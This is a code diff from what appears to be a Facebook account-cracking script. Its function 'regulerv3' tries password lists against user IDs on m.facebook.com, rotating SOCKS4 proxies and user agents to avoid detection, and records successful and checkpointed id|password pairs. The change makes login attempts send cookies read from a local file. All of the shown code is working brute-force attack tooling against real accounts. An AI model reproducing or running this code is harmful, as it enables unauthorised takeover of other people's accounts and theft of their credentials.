@@ -1360,13 +1360,10 @@ def regulerv3(idf,pwv):
 	rc = random.choice
 	prog.update(des,description=f'\r[bold white]Reguler V3[bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
 	prog.advance(des)
-	url = "m.facebook.com"
-	#ua = random.choice(ugen)
-	#ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
-	#ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
 		try:
+			url = "m.facebook.com"
 			ses = requests.Session()
 			rr = random.randint
 			rc = random.choice
@@ -1374,6 +1371,7 @@ def regulerv3(idf,pwv):
 			open('socksku.txt','w').write(proxs)
 			nip = rc(proxs)
 			proxs = {'http': 'socks4://'+nip}
+			cokz = open('.cok.txt','r').read()
 			ua = random.choice(ugen)
 			ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
 			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=1543146675982943&kid_directed_site=0&app_id=1543146675982943&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fapi.clashofstats.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D1543146675982943%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D13aee46f-34bb-4856-8120-1093c2c7caa0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.clashofstats.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
@@ -1411,8 +1409,8 @@ def regulerv3(idf,pwv):
 				"accept-encoding": "gzip, deflate, br",
 				"accept-language": "zh-CN;q=0.8,zh;q=0.9",
 				"x-response-format": "JSONStream"}
-			#po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,cookies={"cookie":cokz},allow_redirects=False,proxies=proxs)
-			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,allow_redirects=False,proxies=proxs)
+			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,cookies={"cookie":cokz},allow_redirects=False,proxies=proxs)
+			#po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				cp+=1
 				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
